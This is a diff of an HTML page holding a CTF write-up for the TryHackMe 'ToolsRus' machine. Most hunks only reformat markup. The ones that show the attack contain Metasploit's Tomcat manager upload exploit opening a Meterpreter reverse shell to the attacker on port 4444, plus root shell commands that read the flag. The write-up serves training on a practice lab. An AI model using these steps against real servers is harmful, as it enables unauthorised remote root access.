@@ -1,43 +1,44 @@
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
 
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 
     <title>ToolsRus CTF | write-up</title>
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=0a4893ecd9">
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=f12a2fbdf2" />
 
-    <link rel="icon" href="../favicon.png" type="image/png">
-    <link rel="canonical" href="index.html">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <link rel="amphtml" href="amp/index.html">
+    <link rel="icon" href="../favicon.png" type="image/png" />
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
     
-    <meta property="og:site_name" content="fr33s0ul">
-    <meta property="og:type" content="article">
-    <meta property="og:title" content="ToolsRus CTF | write-up">
-    <meta property="og:description" content="Hello all, today's challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward. Let's enumerate the machine root@kali:~# nmap -sC -sV 10.10.27.83 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC Nmap scan report for ip-10-10-27-83.eu-west-1.">
-    <meta property="og:url" content="https://fr33s0ul.tech/toolsrus-ctf-write-up/">
-    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg">
-    <meta property="article:published_time" content="2020-04-03T13:44:52.000Z">
-    <meta property="article:modified_time" content="2020-11-21T15:22:48.000Z">
-    <meta property="article:tag" content="CTF">
+    <meta property="og:site_name" content="fr33s0ul" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="ToolsRus CTF | write-up" />
+    <meta property="og:description" content="Hello all, today&#x27;s challenge is made by Tryhackme.com, it&#x27;s a fun CTF ratted as easy, totally straight forward. Let&#x27;s enumerate the machine root@kali:~# nmap -sC -sV 10.10.27.83 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC Nmap scan report for ip-10-10-27-83.eu-west-1." />
+    <meta property="og:url" content="https://fr33s0ul.tech/toolsrus-ctf-write-up/" />
+    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" />
+    <meta property="article:published_time" content="2020-04-03T13:44:52.000Z" />
+    <meta property="article:modified_time" content="2020-11-21T15:22:48.000Z" />
+    <meta property="article:tag" content="CTF" />
     
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="ToolsRus CTF | write-up">
-    <meta name="twitter:description" content="Hello all, today's challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward. Let's enumerate the machine root@kali:~# nmap -sC -sV 10.10.27.83 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC Nmap scan report for ip-10-10-27-83.eu-west-1.">
-    <meta name="twitter:url" content="https://fr33s0ul.tech/toolsrus-ctf-write-up/">
-    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg">
-    <meta name="twitter:label1" content="Written by">
-    <meta name="twitter:data1" content="fr33s0ul">
-    <meta name="twitter:label2" content="Filed under">
-    <meta name="twitter:data2" content="CTF">
-    <meta name="twitter:site" content="@fr33soul_">
-    <meta name="twitter:creator" content="@fr33soul_">
-    <meta property="og:image:width" content="1144">
-    <meta property="og:image:height" content="992">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="ToolsRus CTF | write-up" />
+    <meta name="twitter:description" content="Hello all, today&#x27;s challenge is made by Tryhackme.com, it&#x27;s a fun CTF ratted as easy, totally straight forward. Let&#x27;s enumerate the machine root@kali:~# nmap -sC -sV 10.10.27.83 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC Nmap scan report for ip-10-10-27-83.eu-west-1." />
+    <meta name="twitter:url" content="https://fr33s0ul.tech/toolsrus-ctf-write-up/" />
+    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="fr33s0ul" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="CTF" />
+    <meta name="twitter:site" content="@fr33soul_" />
+    <meta name="twitter:creator" content="@fr33soul_" />
+    <meta property="og:image:width" content="1144" />
+    <meta property="og:image:height" content="992" />
     
     <script type="application/ld+json">
 {
@@ -87,8 +88,8 @@
 }
     </script>
 
-    <meta name="generator" content="Ghost 3.38">
-    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../rss/index.html">
+    <meta name="generator" content="Ghost 3.38" />
+    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../rss/index.html" />
     <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-111725042-2"></script>
 <script>
@@ -112,14 +113,14 @@
         <nav class="site-nav">
     <div class="site-nav-left-wrapper">
         <div class="site-nav-left">
-                <a class="site-nav-logo" href="../"><img src="../content/images/size/w1000/2020/03/logo.gif" alt="fr33s0ul"></a>
+                <a class="site-nav-logo" href="../index.html"><img src="../content/images/size/w1000/2020/03/logo.gif" alt="fr33s0ul" /></a>
             <div class="site-nav-content">
                     <ul class="nav">
-    <li class="nav-home"><a href="../">Home</a></li>
-    <li class="nav-whoami"><a href="../whoami/">whoami</a></li>
-    <li class="nav-whispers"><a href="../whispers/">Whispers</a></li>
-    <li class="nav-ai"><a href="../tag/ai/">Ai</a></li>
-    <li class="nav-ctf"><a href="../tag/ctf/">CTF</a></li>
+    <li class="nav-home"><a href="../index.html">Home</a></li>
+    <li class="nav-whoami"><a href="../whoami/index.html">whoami</a></li>
+    <li class="nav-whispers"><a href="../whispers/index.html">Whispers</a></li>
+    <li class="nav-ai"><a href="../tag/ai/index.html">Ai</a></li>
+    <li class="nav-ctf"><a href="../tag/ctf/index.html">CTF</a></li>
 </ul>
 
                     <span class="nav-post-title ">ToolsRus CTF | write-up</span>
@@ -128,10 +129,10 @@
     </div>
     <div class="site-nav-right">
             <div class="social-links">
-                    <a class="social-link social-link-tw" href="https://twitter.com/fr33soul_" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
+                    <a class="social-link social-link-tw" href="https://twitter.com/fr33soul_" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
 </a>
             </div>
-                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://fr33s0ul.tech/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
+                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://fr33s0ul.tech/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
 </a>
 
     </div>
@@ -148,7 +149,7 @@
             <header class="post-full-header">
 
                 <section class="post-full-tags">
-                    <a href="../tag/ctf/">CTF</a>
+                    <a href="../tag/ctf/index.html">CTF</a>
                 </section>
 
                 <h1 class="post-full-title">ToolsRus CTF | write-up</h1>
@@ -162,25 +163,28 @@
                             <li class="author-list-item">
 
                                 <div class="author-card">
-                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" />
                                     <div class="author-info">
-                                        <h2>fr33s0ul</h2>
-                                        <p>Read <a href="../author/fr33s0ul/">more posts</a> by this author.</p>
+                                        <div class="bio">
+                                            <h2>fr33s0ul</h2>
+                                            <p>A humble person interested to technology since first 3 way handshake, Having one goal from all of this, Sharing knowledge for the sake of change to a better humanity.</p>
+                                            <p><a href="../author/fr33s0ul/index.html">More posts</a> by fr33s0ul.</p>
+                                        </div>
                                     </div>
                                 </div>
 
-                                <a href="../author/fr33s0ul/" class="author-avatar">
-                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                                <a href="../author/fr33s0ul/index.html" class="author-avatar">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" />
                                 </a>
 
                             </li>
                         </ul>
 
                         <section class="post-full-byline-meta">
-                            <h4 class="author-name"><a href="../author/fr33s0ul/">fr33s0ul</a></h4>
+                            <h4 class="author-name"><a href="../author/fr33s0ul/index.html">fr33s0ul</a></h4>
                             <div class="byline-meta-content">
                                 <time class="byline-meta-date" datetime="2020-04-03">3 Apr 2020</time>
-                                <span class="byline-reading-time"><span class="bull">•</span> 6 min read</span>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 6 min read</span>
                             </div>
                         </section>
 
@@ -191,12 +195,17 @@
             </header>
 
             <figure class="post-full-image">
-                <img srcset="../content/images/size/w300/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 300w,
+                <img
+                    srcset="../content/images/size/w300/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 300w,
                            ../content/images/size/w600/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 600w,
                           ../content/images/size/w1000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 1000w,
-                         ../content/images/size/w2000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 2000w" sizes="(max-width: 800px) 400px,
+                         ../content/images/size/w2000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 2000w"
+                    sizes="(max-width: 800px) 400px,
                         (max-width: 1170px) 1170px,
-                            2000px" src="../content/images/size/w2000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" alt="ToolsRus CTF | write-up">
+                            2000px"
+                    src="../content/images/size/w2000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg"
+                    alt="ToolsRus CTF | write-up"
+                />
             </figure>
 
             <section class="post-full-content">
@@ -305,7 +314,7 @@ msf5 exploit(multi/http/tomcat_mgr_upload) &gt; run
 [*] Sending stage (53906 bytes) to 10.10.27.83
 [*] Meterpreter session 1 opened (10.10.152.253:4444 -&gt; 10.10.27.83:47080) at 2020-04-03 14:12:10 +0000
 
-meterpreter &gt;</code></pre><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/oKzYzmKjlPgEU" width="480" height="420" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/reactiongifs-oKzYzmKjlPgEU"></a></p><!--kg-card-end: html--><p>and we have a shell, so technically what happened the script logged in went to <strong>/manager </strong>and uploaded a war file and gave us an easy lazy reverse shell and not any shell a <strong>root</strong> user shell ...</p><pre><code>meterpreter &gt; getuid
+meterpreter &gt;</code></pre><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/oKzYzmKjlPgEU" width="480" height="420" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/reactiongifs-oKzYzmKjlPgEU"></a></p><!--kg-card-end: html--><p>and we have a shell, so technically what happened the script logged in went to <strong>/manager </strong>and uploaded a war file and gave us an easy lazy reverse shell and not any shell a <strong>root</strong> user shell ...</p><pre><code>meterpreter &gt; getuid
 Server username: root
 meterpreter &gt; shell
 Process 4 created.
@@ -338,7 +347,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 root@ip-10-10-27-83:/# id
 id
 uid=0(root) gid=0(root) groups=0(root)
-root@ip-10-10-27-83:/#</code></pre><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/WuGSL4LFUMQU" width="480" height="374" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/oooh-WuGSL4LFUMQU"></a></p><!--kg-card-end: html--><pre><code>root@ip-10-10-27-83:~# ls -la /root
+root@ip-10-10-27-83:/#</code></pre><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/WuGSL4LFUMQU" width="480" height="374" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/oooh-WuGSL4LFUMQU"></a></p><!--kg-card-end: html--><pre><code>root@ip-10-10-27-83:~# ls -la /root
 ls -la /root
 total 40
 drwx------  5 root root 4096 Mar 11  2019 .
@@ -354,7 +363,7 @@ drwx------  2 root root 4096 Mar 10  2019 .ssh
 root@ip-10-10-27-83:~# cat /root/flag.txt
 cat /root/flag.txt
 ffxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-root@ip-10-10-27-83:~#</code></pre><p>and here you are a root guru and you got the flag happy with that, but make sure to focus more on the most important part, is to understand why does it work, why exactly when you ran exploit or run in that msfconsole it gave you back a reverse shell, if you are interested on reading more about this exploit, I will leave the ruby file of the exploit used in metasploit and more details on the exploit itself.</p><p>Happy Hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/tomcat_mgr_upload.rb"><div class="kg-bookmark-content"><div class="kg-bookmark-title">rapid7/metasploit-framework</div><div class="kg-bookmark-description">Metasploit Framework. Contribute to rapid7/metasploit-framework development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg"><span class="kg-bookmark-author">rapid7</span><span class="kg-bookmark-publisher">GitHub</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://avatars3.githubusercontent.com/u/1013671?s=400&amp;v=4"></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Apache Tomcat Manager Authenticated Upload Code Execution</div><div class="kg-bookmark-description">Rapid7′s VulnDB is curated repository of vetted computer software exploits and exploitable vulnerabilities.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://www.rapid7.com/includes/img/favicon.ico"><span class="kg-bookmark-publisher">Rapid7</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://www.rapid7.com/globalassets/rapid7-og.jpg"></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.cvedetails.com/cve/CVE-2009-3548/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">CVE-2009-3548 : The Windows installer for Apache Tomcat 6.0.0 through 6.0.20, 5.5.0 through 5.5.28, and possibly earlier versions uses a</div><div class="kg-bookmark-description">CVE-2009-3548 : The Windows installer for Apache Tomcat 6.0.0 through 6.0.20, 5.5.0 through 5.5.28, and possibly earlier versions uses a blank default password for the administrative user, which allows remote attackers to gain privileges.</div><div class="kg-bookmark-metadata"></div></div><div class="kg-bookmark-thumbnail"><img src="https://www.cvedetails.com/img/logo2.png"></div></a></figure><!--kg-card-begin: html--><a href="https://www.patreon.com/bePatron?u=45903047" data-patreon-widget-type="become-patron-button">You can support my content, and help me do more and more by becoming a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script><!--kg-card-end: html-->
+root@ip-10-10-27-83:~#</code></pre><p>and here you are a root guru and you got the flag happy with that, but make sure to focus more on the most important part, is to understand why does it work, why exactly when you ran exploit or run in that msfconsole it gave you back a reverse shell, if you are interested on reading more about this exploit, I will leave the ruby file of the exploit used in metasploit and more details on the exploit itself.</p><p>Happy Hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/tomcat_mgr_upload.rb"><div class="kg-bookmark-content"><div class="kg-bookmark-title">rapid7/metasploit-framework</div><div class="kg-bookmark-description">Metasploit Framework. Contribute to rapid7/metasploit-framework development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg"><span class="kg-bookmark-author">rapid7</span><span class="kg-bookmark-publisher">GitHub</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://avatars3.githubusercontent.com/u/1013671?s&#x3D;400&amp;v&#x3D;4"></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Apache Tomcat Manager Authenticated Upload Code Execution</div><div class="kg-bookmark-description">Rapid7′s VulnDB is curated repository of vetted computer software exploits and exploitable vulnerabilities.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://www.rapid7.com/includes/img/favicon.ico"><span class="kg-bookmark-publisher">Rapid7</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://www.rapid7.com/globalassets/rapid7-og.jpg"></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.cvedetails.com/cve/CVE-2009-3548/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">CVE-2009-3548 : The Windows installer for Apache Tomcat 6.0.0 through 6.0.20, 5.5.0 through 5.5.28, and possibly earlier versions uses a</div><div class="kg-bookmark-description">CVE-2009-3548 : The Windows installer for Apache Tomcat 6.0.0 through 6.0.20, 5.5.0 through 5.5.28, and possibly earlier versions uses a blank default password for the administrative user, which allows remote attackers to gain privileges.</div><div class="kg-bookmark-metadata"></div></div><div class="kg-bookmark-thumbnail"><img src="https://www.cvedetails.com/img/logo2.png"></div></a></figure><!--kg-card-begin: html--><a href="https://www.patreon.com/bePatron?u=45903047" data-patreon-widget-type="become-patron-button">You can support my content, and help me do more and more by becoming a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script><!--kg-card-end: html-->
                 </div>
             </section>
 
@@ -370,26 +379,26 @@ root@ip-10-10-27-83:~#</code></pre><p>and here you are a root guru and you got t
         <div class="read-next-feed">
                 <article class="read-next-card">
                     <header class="read-next-card-header">
-                        <h3><span>More in</span> <a href="../tag/ctf/">CTF</a></h3>
+                        <h3><span>More in</span> <a href="../tag/ctf/index.html">CTF</a></h3>
                     </header>
                     <div class="read-next-card-content">
                         <ul>
                             <li>
-                                <h4><a href="../yearoftherabbit-ctf-write-up/">YearOfTheRabbit | CTF write-up</a></h4>
+                                <h4><a href="../yearoftherabbit-ctf-write-up/index.html">YearOfTheRabbit | CTF write-up</a></h4>
                                 <div class="read-next-card-meta">
                                     <p><time datetime="2020-04-22">22 Apr 2020</time> –
                                         9 min read</p>
                                 </div>
                             </li>
                             <li>
-                                <h4><a href="../dogcat-thm-write-up/">dogcat | THM write-up</a></h4>
+                                <h4><a href="../dogcat-thm-write-up/index.html">dogcat | THM write-up</a></h4>
                                 <div class="read-next-card-meta">
                                     <p><time datetime="2020-04-19">19 Apr 2020</time> –
                                         6 min read</p>
                                 </div>
                             </li>
                             <li>
-                                <h4><a href="../lfi/">Local file inclusion | write-up</a></h4>
+                                <h4><a href="../lfi/index.html">Local file inclusion | write-up</a></h4>
                                 <div class="read-next-card-meta">
                                     <p><time datetime="2020-04-17">17 Apr 2020</time> –
                                         6 min read</p>
@@ -398,23 +407,29 @@ root@ip-10-10-27-83:~#</code></pre><p>and here you are a root guru and you got t
                         </ul>
                     </div>
                     <footer class="read-next-card-footer">
-                        <a href="../tag/ctf/">See all 15 posts
+                        <a href="../tag/ctf/index.html">See all 15 posts
                             →</a>
                     </footer>
                 </article>
 
                 <article class="post-card post tag-ctf ">
 
-    <a class="post-card-image-link" href="../kenobi-ctf-write-up/">
-        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/Animated-GIF-downsized_large.gif 300w,
+    <a class="post-card-image-link" href="../kenobi-ctf-write-up/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2020/04/Animated-GIF-downsized_large.gif 300w,
                    ../content/images/size/w600/2020/04/Animated-GIF-downsized_large. gif 600w,
                   ../content/images/size/w1000/2020/04/Animated-GIF-downsized_large. gif 1000w,
-                 ../content/images/size/w2000/2020/04/Animated-GIF-downsized_large. gif 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/Animated-GIF-downsized_large.gif" alt="Kenobi | CTF write-up">
+                 ../content/images/size/w2000/2020/04/Animated-GIF-downsized_large. gif 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            loading="lazy"
+            src="../content/images/size/w600/2020/04/Animated-GIF-downsized_large.gif"
+            alt="Kenobi | CTF write-up"
+        />
     </a>
 
     <div class="post-card-content">
 
-        <a class="post-card-content-link" href="../kenobi-ctf-write-up/">
+        <a class="post-card-content-link" href="../kenobi-ctf-write-up/index.html">
 
             <header class="post-card-header">
                     <div class="post-card-primary-tag">CTF</div>
@@ -435,14 +450,14 @@ root@ip-10-10-27-83:~#</code></pre><p>and here you are a root guru and you got t
                         fr33s0ul
                     </div>
             
-                    <a href="../author/fr33s0ul/" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                    <a href="../author/fr33s0ul/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" />
                     </a>
                 </li>
             </ul>
             <div class="post-card-byline-content">
-                <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
-                <span class="post-card-byline-date"><time datetime="2020-04-07">7 Apr 2020</time> <span class="bull">•</span> 9 min read</span>
+                <span><a href="../author/fr33s0ul/index.html">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-04-07">7 Apr 2020</time> <span class="bull">&bull;</span> 9 min read</span>
             </div>
         </footer>
 
@@ -452,16 +467,22 @@ root@ip-10-10-27-83:~#</code></pre><p>and here you are a root guru and you got t
 
                 <article class="post-card post tag-ctf ">
 
-    <a class="post-card-image-link" href="../ghostcat-write-up/">
-        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/HJI.png 300w,
+    <a class="post-card-image-link" href="../ghostcat-write-up/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2020/04/HJI.png 300w,
                    ../content/images/size/w600/2020/04/HJI.png 600w,
                   ../content/images/size/w1000/2020/04/HJI. png 1000w,
-                 ../content/images/size/w2000/2020/04/HJI. png 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/HJI.png" alt="Retro | write-up">
+                 ../content/images/size/w2000/2020/04/HJI. png 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            loading="lazy"
+            src="../content/images/size/w600/2020/04/HJI.png"
+            alt="Retro | write-up"
+        />
     </a>
 
     <div class="post-card-content">
 
-        <a class="post-card-content-link" href="../ghostcat-write-up/">
+        <a class="post-card-content-link" href="../ghostcat-write-up/index.html">
 
             <header class="post-card-header">
                     <div class="post-card-primary-tag">CTF</div>
@@ -482,14 +503,14 @@ root@ip-10-10-27-83:~#</code></pre><p>and here you are a root guru and you got t
                         fr33s0ul
                     </div>
             
-                    <a href="../author/fr33s0ul/" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                    <a href="../author/fr33s0ul/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" />
                     </a>
                 </li>
             </ul>
             <div class="post-card-byline-content">
-                <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
-                <span class="post-card-byline-date"><time datetime="2020-04-03">3 Apr 2020</time> <span class="bull">•</span> 4 min read</span>
+                <span><a href="../author/fr33s0ul/index.html">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-04-03">3 Apr 2020</time> <span class="bull">&bull;</span> 4 min read</span>
             </div>
         </footer>
 
@@ -505,9 +526,9 @@ root@ip-10-10-27-83:~#</code></pre><p>and here you are a root guru and you got t
 
         <footer class="site-footer outer">
             <div class="site-footer-content inner">
-                <section class="copyright"><a href="../">fr33s0ul</a> © 2020</section>
+                <section class="copyright"><a href="../index.html">fr33s0ul</a> &copy; 2020</section>
                 <nav class="site-footer-nav">
-                    <a href="../">Latest Posts</a>
+                    <a href="../index.html">Latest Posts</a>
                     
                     <a href="https://twitter.com/fr33soul_" target="_blank" rel="noopener">Twitter</a>
                     <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
@@ -518,9 +539,12 @@ root@ip-10-10-27-83:~#</code></pre><p>and here you are a root guru and you got t
     </div>
 
 
-    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
+    <script
+        src="https://code.jquery.com/jquery-3.4.1.min.js"
+        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+        crossorigin="anonymous">
     </script>
-    <script src="../assets/built/casper.js?v=0a4893ecd9"></script>
+    <script src="../assets/built/casper.js?v=f12a2fbdf2"></script>
 
     <script>
         // Parse the URL parameter
@@ -598,3 +622,4 @@ root@ip-10-10-27-83:~#</code></pre><p>and here you are a root guru and you got t
     
 
 </body>
+</html>
